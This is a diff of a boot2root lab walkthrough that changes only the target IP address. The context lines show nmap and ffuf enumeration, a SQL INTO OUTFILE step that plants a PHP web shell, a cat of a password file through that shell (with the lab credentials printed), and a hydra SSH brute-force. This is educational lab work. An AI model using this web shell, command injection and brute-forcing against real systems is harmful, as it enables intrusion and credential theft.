@@ -6,18 +6,18 @@ First, we get the ip address of the `boot2root` machine
 ```
 fping -asgq 192.168.56.0/24
 ...
-192.168.56.112
+192.168.56.114
 ``` 
 
 After, we launch a `nmap` scan to see the ports and services present on the machine.
 ```
-nmap 192.168.56.112
+nmap 192.168.56.114
 ```
 
 To have more informations about the services we will use the *nmap script engine* with the `-sC` and `-sV` flags:
 ```
-ports=$(nmap 192.168.56.112 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',')
-nmap 192.168.56.112 -p$ports -sC -sV
+ports=$(nmap 192.168.56.114 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',')
+nmap 192.168.56.114 -p$ports -sC -sV
 ...
 PORT    STATE SERVICE    VERSION
 21/tcp  open  ftp        vsftpd 2.0.8 or later
@@ -92,7 +92,7 @@ By accessing the port `80` we are responded by a simple web page, not really int
 By accessing the port `443` we are responded with an error page. </br>
 A strategy to see public files and directories from a web site is by making a lot of requests (fuzzing) on differents paths and wait the server's responses. We will use a widely used tool named `ffuf` to enumerates files and directories accessible from the website:
 ```
-ffuf -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -u https://192.168.56.112/FUZZ   
+ffuf -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -u https://192.168.56.114/FUZZ   
 ...
 forum                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 21ms]
 webmail                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 3ms]
@@ -147,7 +147,7 @@ Alias /webmail /usr/share/squirrelmail
 ```
 Reading files was actually limited and writing files was even more difficult. After enumerating more on the `/forum` we find a directory:  
 ```
-ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://192.168.56.112/forum/FUZZ -fs 288
+ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://192.168.56.114/forum/FUZZ -fs 288
 ...
 templates_c             [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 4ms]
 ...
@@ -159,13 +159,13 @@ SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c
 ```
 Making a request to the script should execute it:
 ```
-https://192.168.56.112/forum/templates_c/script.php?cmd=whoami
+https://192.168.56.114/forum/templates_c/script.php?cmd=whoami
 ```
 It works ! We have now a Remote Code Excution on the machine. </br>
 
 The next step is to found interesting files on the machine. And In the `/home` directory we found the folder `LOOKATME` containing the file `password`:
 ```
-https://192.168.56.112/forum/templates_c/script.php?cmd=cat%20/home/LOOKATME/password
+https://192.168.56.114/forum/templates_c/script.php?cmd=cat%20/home/LOOKATME/password
 ...
 lmezard:G!@M6f4Eatau{sF" 
 ```
@@ -383,7 +383,7 @@ o`ekma # multiple values possible
 Joining the strings together doesn't form the right password. Actually the phase 4 can have multiple values and the subject tells something about inversing 2 characters in the end. </br>
 Then with a script and hydra we get the password for `thor`:
 ```
-hydra -l thor -P passwds.txt 192.168.56.112 ssh 
+hydra -l thor -P passwds.txt 192.168.56.114 ssh 
 ...
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
